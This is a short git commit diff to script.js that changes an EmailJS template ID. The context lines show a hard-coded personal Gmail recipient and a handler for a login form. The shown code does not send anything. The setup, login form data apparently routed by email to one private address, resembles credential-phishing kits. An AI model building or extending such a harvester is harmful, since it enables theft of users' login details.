06a38f7c1872fe7b3e003d48ef59bdd23e6b8a53
Ganza-Eloi <ganzaeloi2010@gmail.com>
2026-04-02 16:08:55 +0200

    Update templateID for email service

--- script.js
+++ script.js
@@ -1,6 +1,6 @@
 emailjs.init("5CGc5Ri_EPWY0QNay");
 const serviceID = " service_vhfep6d";
-const templateID = "template_xkf9d24";
+const templateID = "template_m90e9la";
 const recipientEmail = "ganzaeloi2010@gmail.com";
 document.addEventListener('DOMContentLoaded', () => {
   const loginForm = document.getElementById('loginForm');
